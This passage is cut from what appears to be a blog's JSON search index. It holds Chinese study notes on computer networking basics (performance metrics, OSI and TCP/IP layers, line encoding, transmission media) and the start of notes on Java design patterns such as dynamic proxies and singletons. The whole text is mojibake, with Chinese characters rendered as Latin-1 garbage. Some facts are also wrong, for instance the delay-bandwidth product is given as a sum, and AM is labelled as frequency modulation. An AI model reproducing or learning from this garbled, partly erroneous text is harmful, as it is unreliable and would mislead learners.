æ¦‚å¿µè®¡ç®—æœºç½‘ç»œæ˜¯ä¸€ä¸ªåˆ†æ•£çš„ã€å…·æœ‰ç‹¬ç«‹åŠŸèƒ½çš„è®¡ç®—æœºç³»ç»Ÿï¼Œé€šè¿‡é€šè®¯è®¾å¤‡ä¸çº¿è·¯è¿æ¥èµ·æ¥ç”±åŠŸèƒ½å®Œå–„çš„è½¯ä»¶å®ç°èµ„æºå…±äº«å’Œä¿¡æ¯å…±äº«çš„ç³»ç»Ÿã€‚ ç»„æˆ1.ç»„æˆéƒ¨åˆ†ç¡¬ä»¶ã€è½¯ä»¶ã€åè®® 2.å·¥ä½œæ–¹å¼è¾¹ç¼˜éƒ¨åˆ† ç”¨æˆ·ç›´æ¥ä½¿ç”¨ C/Sæ–¹å¼ P2Pæ–¹å¼ æ ¸å¿ƒéƒ¨åˆ† ä¸ºè¾¹ç¼˜éƒ¨åˆ†æœåŠ¡ 3.åŠŸèƒ½ç»„æˆ é€šä¿¡å­ç½‘ å®ç°æ•°æ®é€šä¿¡ èµ„æºå­ç½‘ å®ç°èµ„æºå…±äº«/æ•°æ®å¤„ç† 1595656824503 åˆ†ç±»1.æŒ‰åˆ†å¸ƒèŒƒå›´åˆ†:å¹¿åŸŸç½‘WANï¼ŒåŸåŸŸç½‘MANï¼Œå±€åŸŸç½‘LANï¼Œä¸ªäººåŒºåŸŸç½‘PAN 2.æŒ‰ä½¿ç”¨è€…åˆ†: å…¬ç”¨ç½‘(ä¸­å›½ç”µä¿¡), ä¸“ç”¨ç½‘(å†›äº‹) 3.æŒ‰äº¤æ¢æŠ€æœ¯åˆ†:ç”µè·¯äº¤æ¢ã€æŠ¥æ–‡äº¤æ¢ã€åˆ†ç»„äº¤æ¢ 4.æŒ‰æ‹“æ‰‘ç»“æ„åˆ†ï¼š 5.æŒ‰ä¼ è¾“æŠ€æœ¯æ¥åˆ†ï¼š å¹¿æ’­å¼ç½‘ç»œï¼šå…±äº«å…¬å…±é€šä¿¡ä¿¡é“ ç‚¹å¯¹ç‚¹ç½‘ç»œï¼šä½¿ç”¨åˆ†ç»„å­˜å‚¨è½¬å‘å’Œè·¯ç”±é€‰æ‹©æœºåˆ¶ 1595657435356 æ ‡å‡†åŒ–å·¥ä½œè¦å®ç°ä¸åŒå‚å•†çš„ç¡¬ã€è½¯ä»¶ä¹‹é—´ç›¸äº’è¿é€šï¼Œå¿…é¡»éµä»ç»Ÿä¸€çš„æ ‡å‡†ã€‚ æ ‡å‡†çš„åˆ†ç±»æ³•å®šæ ‡å‡† ç”±æƒå¨æœºæ„åˆ¶å®šçš„æ­£å¼çš„ã€åˆæ³•çš„æ ‡å‡† OSI äº‹å®æ ‡å‡† æŸäº›å…¬å¸çš„äº§å“åœ¨ç«äº‰ä¸­å æ®äº†ä¸»æµï¼Œæ—¶é—´é•¿äº† è¿™äº›äº§å“ä¸­çš„åè®®å’ŒæŠ€æœ¯å°±æˆäº†æ ‡å‡† TCP/IP 1595658054792 æ€§èƒ½æŒ‡æ ‡é€Ÿç‡é€Ÿç‡å³æ•°æ®ç‡æˆ–ç§°æ•°æ®ä¼ è¾“ç‡æˆ–æ¯”ç‰¹ç‡ æ¯”ç‰¹ æ•°æ®ä¼ è¾“å•ä½ 1/0 ä½ è¿æ¥åœ¨è®¡ç®—æœºç½‘ç»œä¸Šçš„ä¸»æœºåœ¨æ•°å­—ä¿¡é“ä¸Šä¼ é€æ•°æ®ä½æ•°çš„é€Ÿç‡ å•ä½æ˜¯b/sï¼Œkb/sï¼ŒMb/sï¼ŒGb/sï¼ŒTb/s 1kb/s = 10ä¸‰æ¬¡æ–¹b/s å­˜å‚¨å®¹é‡ 1Byteï¼ˆå­—èŠ‚ï¼‰=8bitï¼ˆæ¯”ç‰¹ï¼‰ 1KB=2åæ¬¡æ–¹B=1024B=1024*8b 1MB=2åæ¬¡æ–¹KB=1024KB å¸¦å®½ å¸¦å®½åŸæœ¬æŒ‡æŸä¸ªä¿¡å·å…·æœ‰çš„é¢‘å¸¦å®½åº¦ï¼Œå³æœ€é«˜é¢‘ç‡ä¸æœ€ä½é¢‘ç‡ä¹‹å·®ï¼Œå•ä½æ˜¯èµ«å…¹ï¼ˆHzï¼‰ã€‚ è®¡ç®—æœºç½‘ç»œä¸­ï¼Œå¸¦å®½ç”¨æ¥è¡¨ç¤ºç½‘ç»œçš„é€šä¿¡çº¿è·¯ä¼ é€æ•°æ®çš„èƒ½åŠ›ï¼Œé€šå¸¸æ˜¯æŒ‡å•ä½æ—¶é—´å†…ä»ç½‘ç»œä¸­çš„æŸä¸€ç‚¹åˆ°å¦ä¸€ç‚¹æ‰€èƒ½é€šè¿‡çš„â€œæœ€é«˜æ•°æ®ç‡â€ã€‚å•ä½æ˜¯ æ¯”ç‰¹æ¯ç§’ ã€‚b/sï¼Œkb/sï¼ŒMb/sï¼ŒGb/sã€‚ ç½‘ç»œè®¾å¤‡æ‰€æ”¯æŒçš„æœ€é«˜é€Ÿåº¦ã€‚ 1595672692067 ååé‡ è¡¨ç¤ºåœ¨å•ä½æ—¶é—´å†…é€šè¿‡æŸä¸ªç½‘ç»œï¼ˆæˆ–ä¿¡é“ã€æ¥å£ï¼‰çš„æ•°æ®é‡ã€‚å•ä½b/sï¼Œkb/sï¼ŒMb/sç­‰ã€‚ ååé‡å—ç½‘ç»œçš„å¸¦å®½æˆ–ç½‘ç»œçš„é¢å®šé€Ÿç‡çš„é™åˆ¶ã€‚ å¸¦å®½å¯ä»¥ç†è§£ä¸ºé“¾è·¯çš„ç†è®ºä¼ è¾“é€Ÿç‡ä¸Šé™ï¼Œååé‡æ˜¯æŸæ—¶é—´å†…é“¾è·¯å®é™…çš„æ•°æ®é‡ 1595673130968 æ—¶å»¶æŒ‡æ•°æ®ï¼ˆæŠ¥æ–‡/åˆ†ç»„/æ¯”ç‰¹æµï¼‰ä»ç½‘ç»œä¸Šï¼ˆæˆ–é“¾è·¯ï¼‰çš„ä¸€ç«¯ä¼ é€åˆ°å¦ä¸€ç«¯æ‰€éœ€è¦çš„æ—¶é—´ã€‚ä¹Ÿå«å»¶è¿Ÿæˆ–è¿Ÿå»¶ã€‚å•ä½æ˜¯sã€‚ æ—¶å»¶ å‘é€æ—¶å»¶ï¼ˆä¼ æ’­æ—¶å»¶ï¼‰: ä»å‘é€åˆ†ç»„çš„ç¬¬ä¸€ä¸ªæ¯”ç‰¹ç®—èµ·ï¼Œåˆ°è¯¥åˆ†ç»„çš„æœ€åä¸€ä¸ªæ¯”ç‰¹å‘é€å®Œæ¯•æ‰€éœ€çš„æ—¶é—´ã€‚å‘ç”Ÿåœ¨ç½‘ç»œè®¾é…å™¨ä¸Šã€‚ æ•°æ®é•¿åº¦ å‘é€æ—¶å»¶ï¼š --------------- ä¿¡é“å¸¦å®½(å‘é€é€Ÿç‡) ä¼ æ’­æ—¶å»¶ï¼šå–å†³äºç”µç£æ³¢ä¼ æ’­é€Ÿåº¦å’Œé“¾è·¯é•¿åº¦ã€‚å‘ç”Ÿåœ¨ä¿¡é“ä¸Šçš„ã€‚ ä¿¡é“é•¿åº¦ ä¼ æ’­æ—¶å»¶ï¼š â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” ç”µç£æ³¢åœ¨ä¿¡é“ä¸Šçš„ä¼ æ’­é€Ÿç‡ æ’é˜Ÿæ—¶å»¶ï¼šç­‰å¾…è¾“å‡º/å…¥ é“¾è·¯å¯ç”¨ å¤„ç†æ—¶å»¶ å¤„ç†æ—¶å»¶ï¼ˆæµ·æ°´æå–ç›ï¼‰ å‘é€æ—¶å»¶ï¼ˆè¿ç›åˆ°åŸé‡Œï¼‰æ’é˜Ÿæ—¶å»¶ï¼ˆä¹°ç›ï¼‰ä¼ æ’­æ—¶å»¶ï¼ˆç»™ä½ ç›ï¼‰ æ—¶å»¶å¸¦å®½ç§¯æ—¶å»¶å¸¦å®½ç§¯ = ä¼ æ’­æ—¶å»¶ + å¸¦å®½ æ—¶å»¶å¸¦å®½ç§¯åˆç§°ä¸ºä»¥æ¯”ç‰¹ä½å•ä½çš„é“¾è·¯é•¿åº¦ã€‚ 1595677093363 å³â€œå¡æ»¡é“¾è·¯æ—¶å€™çš„æ¯”ç‰¹é•¿åº¦â€ã€‚ å®¹é‡ å¾€è¿”æ—¶å»¶RTTä»å‘é€æ–¹å‘é€æ•°æ®å¼€å§‹ï¼Œåˆ°å‘é€æ–¹æ”¶åˆ°æ¥æ”¶æ–¹çš„ç¡®è®¤ï¼ˆæ¥æ”¶æ–¹æ”¶åˆ°æ•°æ®åç«‹å³å‘é€ç¡®è®¤ï¼‰ï¼Œæ€»å…±ç»å†çš„æ—¶å»¶ã€‚ RTTè¶Šå¤§ï¼Œåœ¨æ”¶åˆ°ç¡®è®¤ä¹‹å‰ï¼Œå¯ä»¥å‘é€çš„æ•°æ®è¶Šå¤šã€‚ RTTåŒ…æ‹¬ å¾€è¿”ä¼ æ’­æ—¶å»¶=ä¼ æ’­æ—¶å»¶*2 æœ«ç«¯å¤„ç†æ—¶é—´ åˆ©ç”¨ç‡ ä¿¡é“åˆ©ç”¨ç‡ æœ‰æ•°æ®é€šè¿‡çš„æ—¶é—´ = --------------------- (æœ‰+æ— )æ•°æ®é€šè¿‡çš„æ—¶é—´ ç½‘ç»œåˆ©ç”¨ç‡ ä¿¡é“åˆ©ç”¨ç‡åŠ æƒå¹³å‡å€¼ åˆ†å±‚ä¸ºä»€ä¹ˆè¦åˆ†å±‚ï¼Ÿ å‘é€æ–‡ä»¶å‰è¦å®Œæˆçš„å·¥ä½œï¼š 1ï¼‰å‘èµ·é€šä¿¡çš„è®¡ç®—æœºå¿…é¡»å°†æ•°æ®é€šä¿¡çš„é€šè·¯è¿›è¡Œæ¿€æ´»ã€‚ 2ï¼‰è¦å‘Šè¯‰ç½‘ç»œå¦‚ä½•è¯†åˆ«ç›®æ ‡ä¸»æœº 3ï¼‰å‘èµ·é€šä¿¡çš„è®¡ç®—æœºè¦æŸ¥æ˜ç›®çš„ä¸»æœºæ˜¯å¦å¼€æœºï¼Œå¹¶ä¸”ä¸ç½‘ç»œè¿æ¥æ­£å¸¸ã€‚ 4ï¼‰å‘èµ·é€šä¿¡çš„è®¡ç®—æœºè¦å¼„æ¸…æ¥šï¼Œå¯¹æ–¹è®¡ç®—æœºä¸­æ–‡ä»¶ç®¡ç†ç¨‹åºæ˜¯å¦å·²ç»åšå¥½å‡†å¤‡å·¥ä½œã€‚ 5ï¼‰ç¡®ä¿å·®é”™å’Œæ„å¤–å¯ä»¥è§£å†³ ã€‚ã€‚ã€‚ã€‚ åˆ†å±‚çš„åŸºæœ¬åŸåˆ™1595680127532 åˆ†å±‚ç»“æ„1595680374095 1595680481539 æ¦‚å¿µ1595680650673 1595680837889 OSIå‚è€ƒæ¨¡å‹1595681276589 ç‰©è”ç½‘è¾“ä¼šç¤ºç”¨ é€šä¿¡è¿‡ç¨‹1595681657991 1595681913816 åº”ç”¨å±‚ ç”¨æˆ·ä¸ç½‘ç»œçš„ç•Œé¢ æ‰€æœ‰èƒ½å’Œç”¨æˆ·äº¤äº’äº§ç”Ÿç½‘ç»œæµé‡çš„ç¨‹åº åº”ç”¨å±‚æœåŠ¡: æ–‡ä»¶ä¼ è¾“(FTP) ç”µå­é‚®ä»¶(SMTP) ä¸‡ç»´ç½‘(HTTP) è¡¨ç¤ºå±‚ ç”¨äºå¤„ç†åœ¨ä¸¤ä¸ªé€šä¿¡ç³»ç»Ÿä¸­äº¤æ¢ä¿¡æ¯çš„è¡¨ç¤ºæ–¹å¼(è¯­æ³•å’Œè¯­ä¹‰) åŠŸèƒ½ä¸€: æ•°æ®æ ¼å¼äº¤æ¢ åŠŸèƒ½äºŒ: æ•°æ®åŠ å¯†è§£å¯† åŠŸèƒ½ä¸‰: æ•°æ®å‹ç¼©å’Œæ¢å¤ ä¼šè¯å±‚ å‘è¡¨ç¤ºå±‚å®ä½“/ç”¨æˆ·è¿›ç¨‹æä¾›å»ºç«‹è¿æ¥å¹¶åœ¨è¿æ¥ä¸Šæœ‰åºåœ°ä¼ è¾“æ•°æ®. è¿™æ˜¯ä¼šè¯,ä¹Ÿæ˜¯å»ºç«‹åŒæ­¥(SYN) åŠŸèƒ½: ä¸€. å»ºç«‹,ç®¡ç†,ç»ˆæ­¢ä¼šè¯ äºŒ. ä½¿ç”¨æ ¡éªŒç‚¹å¯ä½¿ä¼šè¯åœ¨é€šä¿¡å¤±æ•ˆæ—¶ä»æ ¡éªŒç‚¹/åŒæ­¥ç‚¹ç»§ç»­æ¢å¤é€šä¿¡,å®ç°æ•°æ®åŒæ­¥. é€‚ç”¨äºä¼ è¾“å¤§æ–‡ä»¶. ä¼ è¾“å±‚ è´Ÿè´£ä¸»æœºä¸­ä¸¤ä¸ªè¿›ç¨‹çš„é€šä¿¡,å³ç«¯åˆ°ç«¯çš„é€šä¿¡. ä¼ è¾“å•ä½æ—¶æŠ¥æ–‡æ®µæˆ–ç”¨æˆ·æ•°æ®æŠ¥. ä¸Šé¢ä¸‰å±‚çš„éƒ½æ˜¯ä¸»æœºåº”ç”¨äº¤æµ ä¸‹é¢ä¸‰å±‚éƒ½æ˜¯è®¾å¤‡è½¬å‘æ•°æ® åŠŸèƒ½: ä¸€.å¯é ä¼ è¾“,ä¸å¯é ä¼ è¾“ å‘çš„æ–‡å­—æ¶ˆæ¯æ˜¯ä¸å¯é ä¼ è¾“ï¼Œå‘å‡ºå»åå°±ä¸ç®¡äº† äºŒ. å·®é”™æ§åˆ¶ å‘é€çš„æŠ¥æ–‡æ®µä¸¢å¤±äº†, ä¼ è¾“å±‚è´Ÿè´£çº æ­£é”™è¯¯. ä¸‰. æµé‡æ§åˆ¶ å››. å¤ç”¨åˆ†ç”¨ å¤ç”¨:å¤šä¸ªåº”ç”¨å±‚è¿›ç¨‹å¯åŒæ—¶ä½¿ç”¨ä¸‹é¢è¿è¾“å±‚çš„æœåŠ¡. åˆ†ç”¨: è¿è¾“å±‚æŠŠæ”¶åˆ°çš„ä¿¡æ¯åˆ†åˆ«äº¤ä»˜ç»™ä¸Šé¢åº”ç”¨å±‚çš„ç›¸åº”çš„è¿›ç¨‹. ç½‘ç»œå±‚ ä¸»è¦ä»»åŠ¡æ˜¯æŠŠåˆ†ç»„ä»æºç«¯ä¼ åˆ°ç›®çš„ç«¯,ä¸ºåˆ†ç»„äº¤æ¢ç½‘ä¸Šçš„ä¸åŒä¸»æœºæä¾›é€šä¿¡æœåŠ¡.ç½‘ç»œå±‚ä¼ è¾“å•ä½æ˜¯æ•°æ®æŠ¥ åŠŸèƒ½: ä¸€.è·¯ç”±é€‰æ‹©. æœ€ä½³è·¯å¾„ äºŒ.æµé‡æ§åˆ¶ ä¸‰.å·®é”™æ§åˆ¶ å››.æ‹¥å¡æ§åˆ¶ è‹¥æ‰€æœ‰èŠ‚ç‚¹éƒ½æ¥ä¸åŠæ¥å—åˆ†ç»„,è€Œè¦ä¸¢å¼ƒå¤§é‡åˆ†ç»„çš„è¯,ç½‘ç»œå°±å¤„äºæ‹¥å¡çŠ¶æ€.å› æ­¤è¦é‡‡å–ä¸€å®šæªæ–½,ç¼“è§£è¿™ç§æ‹¥å¡. æ•°æ®é“¾è·¯å±‚ ä¸»è¦ä»»åŠ¡æ˜¯æŠŠç½‘ç»œå±‚ä¼ ä¸‹æ¥çš„æ•°æ®æŠ¥ç»„è£…æˆå¸§. æ•°æ®é“¾è·¯å±‚/é“¾è·¯å±‚çš„ä¼ è¾“å•ä½æ˜¯å¸§. 1595741033636 ç‰©ç†å±‚ ä¸»è¦ä»»åŠ¡æ˜¯åœ¨ç‰©ç†åª’ä½“ä¸Šå®ç°æ¯”ç‰¹æµçš„é€æ˜ä¼ è¾“. ç‰©ç†å±‚ä¼ è¾“å•ä½æ˜¯æ¯”ç‰¹. 1595741321230 åŠåŒå·¥(å›åˆåˆ¶) TCP/IPæ¨¡å‹1595741546063 ç›¸åŒç‚¹ï¼š 1.éƒ½åˆ†å±‚ 2.åŸºäºç‹¬ç«‹çš„åè®®æ ˆçš„æ¦‚å¿µ 3.å¯ä»¥å®ç°å¼‚æ„ç½‘ç»œäº’è” ä¸åŒç‚¹ï¼š 1595741799619 5å±‚å‚è€ƒæ¨¡å‹1595742014176 1595742138931 ç‰©ç†å±‚ç‰©ç†å±‚è§£å†³å¦‚ä½•åœ¨è¿æ¥å„ç§è®¡ç®—æœºçš„ä¼ è¾“åª’ä½“ä¸Šä¼ è¾“æ•°æ®æ¯”ç‰¹æµï¼Œè€Œä¸æ˜¯æŒ‡å…·ä½“çš„ä¼ è¾“åª’ä½“ã€‚ 1595754459090 æ•°æ®é€šä¿¡1595754797527 1595756196775 ä¸‰ç§é€šè®¯æ–¹å¼1595756399920 ä¸¤ç§æ•°æ®ä¼ è¾“æ–¹å¼1595756606538 ç å…ƒ1595757214109 é€Ÿç‡,æ³¢ç‰¹,å¸¦å®½1595757658453 1595757864290 å¥ˆå¼å‡†åˆ™ï¼ˆNyquistï¼‰ æ˜¯åœ¨ç†æƒ³çŠ¶æ€ä¸‹å¾—å‡ºçš„ç»“è®º é¦™å†œå…¬å¼ï¼ˆShannonï¼‰æ˜¯åœ¨æœ‰å™ªå£°çš„ä¿¡é“ä¸­å¾—å‡ºçš„ç»“è®º åŸºå¸¦ä¿¡å·å’Œå®½å¸¦/å¸¦é€šä¿¡å·ï¼ˆBase bandï¼Œpass bandï¼‰ è®¡ç®—æœºç½‘ç»œä¸­ç”¨çš„åŸºå¸¦ä¿¡å·æ˜¯æ•°å­—ä¿¡å· ç¼–ç  å°†æ•°æ®è½¬åŒ–ä¸ºæ•°å­—ä¿¡å· æ•°å­—æ•°æ®(digtal data)é€šè¿‡ æ•°å­—å‘é€å™¨(digit emitter) è½¬åŒ–ä¸º æ•°å­—ä¿¡å·(digtal signal) æ¨¡æ‹Ÿæ•°æ®(analog data)é€šè¿‡ PCMç¼–ç å™¨(PCM coder) è½¬åŒ–ä¸º æ•°å­—ä¿¡å· (digtal signal) å•ææ€§ä¸å½’é›¶ç¼–ç ï¼šåªä½¿ç”¨ä¸€ä¸ªç”µå‹å€¼ï¼Œé«˜ç”µå¹³è¡¨ç¤º1ï¼Œä½ç”µå¹³è¡¨ç¤º0. åŒææ€§ä¸å½’é›¶ç¼–ç ï¼šç”¨å¹…å€¼ç›¸ç­‰çš„æ­£è´Ÿç”µå¹³è¡¨ç¤ºäºŒè¿›åˆ¶æ•°1å’Œ0. å•ææ€§å½’é›¶ç¼–ç ï¼šå‘é€ç 1æ—¶é«˜ç”µå¹³åœ¨æ•´ä¸ªç å…ƒæœŸé—´åªæŒç»­ä¸€æ®µæ—¶é—´ï¼Œå…¶ä½™æ—¶é—´è¿”å›é›¶ç”µå¹³ã€‚ åŒææ€§å½’é›¶ç¼–ç ï¼šæ­£è´Ÿé›¶ä¸‰ä¸ªç”µå¹³ï¼Œä¿¡å·æœ¬èº«æºå¸¦åŒæ­¥ä¿¡æ¯ã€‚ æ›¼å½»æ–¯ç‰¹ç¼–ç ï¼šå•ææ€§ç¼–ç çš„ç¼ºç‚¹æ˜¯æ²¡æœ‰åŠæ³•åŒºåˆ†æ­¤æ—¶æ˜¯æ²¡æœ‰ä¿¡å·ï¼Œè¿˜æ˜¯æœ‰ä¿¡å·ï¼Œä½†æ˜¯ä¿¡å·æ˜¯0.è¿™ç§ç¼–ç æ–¹å¼æ˜¯bitä¸­é—´æœ‰ä¿¡å·ï¼Œä½-é«˜è·³è½¬è¡¨ç¤º0ï¼Œé«˜-ä½è·³è½¬è¡¨ç¤º1ï¼Œä¸€ä¸ªæ—¶é’Ÿå‘¨æœŸåªå¯ä»¥è¡¨ç¤ºä¸€ä¸ªbitï¼Œå¹¶ä¸”å¿…é¡»é€šè¿‡ä¸¤æ¬¡é‡‡æ ·æ‰èƒ½å¾—åˆ°ä¸€ä¸ªbitã€‚å®ƒèƒ½æºå¸¦æ—¶é’Ÿä¿¡å·ï¼Œè€Œä¸”èƒ½åŒºåˆ†æ­¤æ—¶æ˜¯æ²¡æœ‰ä¿¡å·è¿˜æ˜¯ä¿¡å·ä¸º0. å·®åˆ†æ›¼å½»æ–¯ç‰¹ç¼–ç ï¼šæŠ—å¹²æ‰°èƒ½åŠ›æ¯”æ›¼å½»æ–¯ç‰¹ç¼–ç æ›´å¼ºã€‚bitä¸bitä¹‹é—´æœ‰ä¿¡å·è·³å˜ï¼Œè¡¨ç¤ºä¸‹ä¸€ä¸ªbitä¸º0ï¼Œbitä¸bitä¹‹é—´æ²¡æœ‰ä¿¡å·è·³å˜ï¼Œè¡¨ç¤ºä¸‹ä¸€ä¸ªbitä¸º1ã€‚ è°ƒåˆ¶ï¼šæ•°æ®è½¬åŒ–ä¸ºæ¨¡æ‹Ÿä¿¡å·ï¼ˆäº†è§£ï¼‰ å¸¸ç”¨çš„è°ƒåˆ¶æ–¹æ³•ï¼šè°ƒé¢‘(AM)ï¼Œè°ƒé¢‘(FM)ï¼Œè°ƒç›¸(PM) æ¨¡æ‹Ÿæ•°æ®(analog data)é€šè¿‡ è°ƒåˆ¶å™¨(modulaotr) è½¬åŒ–ä¸º æ¨¡æ‹Ÿä¿¡å· (analog signal) æ•°å­—æ•°æ®(digtal data)é€šè¿‡ è°ƒåˆ¶å™¨(modulaotr) è½¬åŒ–ä¸º æ¨¡æ‹Ÿä¿¡å· (analog signal) ç‰©ç†å±‚ä¼ è¾“ä»‹è´¨ä¼ è¾“ä»‹è´¨åˆ†ä¸ºå¯¼å‘æ€§ä¼ è¾“ä»‹è´¨å’Œéå¯¼å‘æ€§ä¼ è¾“ä»‹è´¨ å¯¼å‘æ€§ä¼ è¾“ä»‹è´¨ ç”µç£æ³¢æ²¿ç€å›ºä½“åª’ä»‹ï¼ˆé“œçº¿orå…‰çº¤ï¼‰è¢«å¯¼å‘ä¼ æ’­ éå¯¼å‘æ€§ä¼ è¾“ä»‹è´¨ è‡ªç”±ç©ºé—´ï¼Œå¦‚ç©ºæ°”ï¼Œæ°´ç­‰ç­‰ å¸¸è§çš„å¯¼å‘æ€§ä¼ è¾“ä»‹è´¨åŒç»çº¿ æ ¹æ®æœ‰æ— å±è”½å±‚åˆ†ä¸ºå±è”½åŒç»çº¿ï¼ˆSTP) å’Œ æ— å±è”½åŒç»çº¿ï¼ˆUTPï¼‰ åŒè½´ç”µç¼†ï¼ˆCoaxial Cableï¼‰ å…‰çº¤ï¼ˆOptical fiberï¼‰æ ¹æ®å…¥å°„è§’ä¸åŒï¼Œåˆåˆ†ä¸ºå•æ¨¡å…‰çº¤å’Œå¤šæ¨¡å…‰çº¤åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\">æ ¹æ®å…¥å°„è§’ä¸åŒï¼Œåˆåˆ†ä¸ºå•æ¨¡å…‰çº¤å’Œå¤šæ¨¡å…‰çº¤","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://blog.kayleh.top/tags/network/"}]},{"title":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","date":"2020-07-24T01:48:28.000Z","updated":"2021-04-11T17:11:29.040Z","comments":true,"path":"è®¾è®¡æ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/","excerpt":"è®¾è®¡æ¨¡å¼","text":"è®¾è®¡æ¨¡å¼ ç»“æ„å‹æ¨¡å¼å¦‚ä½•å®ç°åŠ¨æ€ä»£ç†ï¼ŸJavaå®ç°åŠ¨æ€ä»£ç†çš„å¤§è‡´æ­¥éª¤å¦‚ä¸‹ï¼š 1.å®šä¹‰ä¸€ä¸ªå§”æ‰˜ç±»å’Œå…¬å…±æ¥å£ã€‚ 2.è‡ªå·±å®šä¹‰ä¸€ä¸ªç±»ï¼ˆè°ƒç”¨å¤„ç†å™¨ç±»ï¼Œå³å®ç° InvocationHandler æ¥å£ï¼‰ï¼Œè¿™ä¸ªç±»çš„ç›®çš„æ˜¯æŒ‡å®šè¿è¡Œæ—¶å°†ç”Ÿæˆçš„ä»£ç†ç±»éœ€è¦å®Œæˆçš„å…·ä½“ä»»åŠ¡ï¼ˆåŒ…æ‹¬Preprocesså’ŒPostprocessï¼‰ï¼Œå³ä»£ç†ç±»è°ƒç”¨ä»»ä½•æ–¹æ³•éƒ½ä¼šç»è¿‡è¿™ä¸ªè°ƒç”¨å¤„ç†å™¨ç±»ï¼ˆåœ¨æœ¬æ–‡æœ€åä¸€èŠ‚å¯¹æ­¤è¿›è¡Œè§£é‡Šï¼‰ã€‚ 3.ç”Ÿæˆä»£ç†å¯¹è±¡ï¼ˆå½“ç„¶ä¹Ÿä¼šç”Ÿæˆä»£ç†ç±»ï¼‰ï¼Œéœ€è¦ä¸ºä»–æŒ‡å®š(1)å§”æ‰˜å¯¹è±¡(2)å®ç°çš„ä¸€ç³»åˆ—æ¥å£(3)è°ƒç”¨å¤„ç†å™¨ç±»çš„å®ä¾‹ã€‚å› æ­¤å¯ä»¥çœ‹å‡ºä¸€ä¸ªä»£ç†å¯¹è±¡å¯¹åº”ä¸€ä¸ªå§”æ‰˜å¯¹è±¡ï¼Œå¯¹åº”ä¸€ä¸ªè°ƒç”¨å¤„ç†å™¨å®ä¾‹ã€‚ 4.Java å®ç°åŠ¨æ€ä»£ç†ä¸»è¦æ¶‰åŠä»¥ä¸‹å‡ ä¸ªç±»ï¼š â‘ java.lang.reflect.Proxy: è¿™æ˜¯ç”Ÿæˆä»£ç†ç±»çš„ä¸»ç±»ï¼Œé€šè¿‡ Proxy ç±»ç”Ÿæˆçš„ä»£ç†ç±»éƒ½ç»§æ‰¿äº† Proxy ç±»ï¼Œå³ DynamicProxyClass extends Proxyã€‚ â‘¡java.lang.reflect.InvocationHandler: è¿™é‡Œç§°ä»–ä¸ºâ€è°ƒç”¨å¤„ç†å™¨â€ï¼Œä»–æ˜¯ä¸€ä¸ªæ¥å£ï¼Œæˆ‘ä»¬åŠ¨æ€ç”Ÿæˆçš„ä»£ç†ç±»éœ€è¦å®Œæˆçš„å…·ä½“å†…å®¹éœ€è¦è‡ªå·±å®šä¹‰ä¸€ä¸ªç±»ï¼Œè€Œè¿™ä¸ªç±»å¿…é¡»å®ç° InvocationHandler æ¥å£ã€‚ public final class $Proxy1 extends Proxy implements Subject{ private InvocationHandler h; private $Proxy1(){} public $Proxy1(InvocationHandler h){ this.h = h; } public int request(int i){ Method method = Subject.class.getMethod(&quot;request&quot;, new Class[]{int.class}); //åˆ›å»ºmethodå¯¹è±¡ return (Integer)h.invoke(this, method, new Object[]{new Integer(i)}); //è°ƒç”¨äº†invokeæ–¹æ³• } } javaä¸­æœ‰å“ªäº›ä»£ç†æ¨¡å¼ï¼Ÿé™æ€ä»£ç†ï¼ŒåŠ¨æ€ä»£ç†ï¼ŒCglibä»£ç†ã€‚ Java IOéƒ½æœ‰å“ªäº›è®¾è®¡æ¨¡å¼ï¼Œç®€å•ä»‹ç»ä¸€ä¸‹ã€‚è£…é¥°æ¨¡å¼å’Œé€‚é…å™¨æ¨¡å¼ åˆ›å»ºè€…æ¨¡å¼è¯·ä½ ä»‹ç»ä¸€ä¸‹å•ä¾‹æ¨¡å¼ï¼Ÿå†è¯´ä¸€è¯´ æ‡’æ±‰å¼çš„å•ä¾‹æ¨¡å¼å¦‚ä½•å®ç°å•ä¾‹ï¼Ÿå®šä¹‰ï¼šä¿è¯ä¸€ä¸ªç±»ä»…æœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶æä¾›ä¸€ä¸ªè®¿é—®å®ƒçš„å…¨å±€è®¿é—®ç‚¹ã€‚ ä¼˜ç‚¹ï¼šå•ä¾‹ç±»åªæœ‰ä¸€ä¸ªå®ä¾‹ã€å…±äº«èµ„æºï¼Œå…¨å±€ä½¿ç”¨èŠ‚çœåˆ›å»ºæ—¶é—´ï¼Œæé«˜æ€§èƒ½ã€‚å¯ä»¥ç”¨é™æ€å†…éƒ¨å®ç°ï¼Œä¿è¯æ˜¯æ‡’åŠ è½½å°±è¡Œäº†ï¼Œå°±æ˜¯ä½¿ç”¨æ‰ä¼šåˆ›å»ºå®ä¾‹å¯¹è±¡ã€‚ è¡Œä¸ºè€…æ¨¡å¼ ç­–ç•¥æ¨¡å¼ä¹Ÿå«æ”¿ç­–æ¨¡å¼ï¼Œæ˜¯ä¸€ç§è¡Œä¸ºå‹è®¾è®¡æ¨¡å¼ï¼Œæ˜¯ä¸€ç§æ¯”è¾ƒç®€å•çš„è®¾è®¡æ¨¡å¼ã€‚ç­–ç•¥æ¨¡å¼é‡‡ç”¨äº†é¢å‘å¯¹è±¡çš„ç»§æ‰¿å’Œå¤šæ€æœºåˆ¶ã€‚ç•¥æ¨¡å¼é€‚åˆä½¿ç”¨åœ¨ï¼š1.å¤šä¸ªç±»åªæœ‰åœ¨ç®—æ³•æˆ–è¡Œä¸ºä¸Šç¨æœ‰ä¸åŒçš„åœºæ™¯ã€‚2.ç®—æ³•éœ€è¦è‡ªç”±åˆ‡æ¢çš„åœºæ™¯ã€‚3.éœ€è¦å±è”½ç®—æ³•è§„åˆ™çš„åœºæ™¯ã€‚ 